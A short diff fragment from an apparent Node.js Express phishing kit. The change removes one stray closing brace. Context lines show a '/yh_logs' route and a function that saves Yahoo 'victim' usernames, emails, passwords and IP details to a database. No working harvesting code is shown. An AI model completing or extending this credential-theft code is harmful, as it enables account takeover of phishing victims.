@@ -69,7 +69,6 @@ app.get("/yh_logs", (req, res) => {
 
 app.use(express.static('web'));
 
-})
 
 
 function getVictimIpInfoAndSaveYahooVictimInfoToDb(username, email, password, userAgent, req, res) {
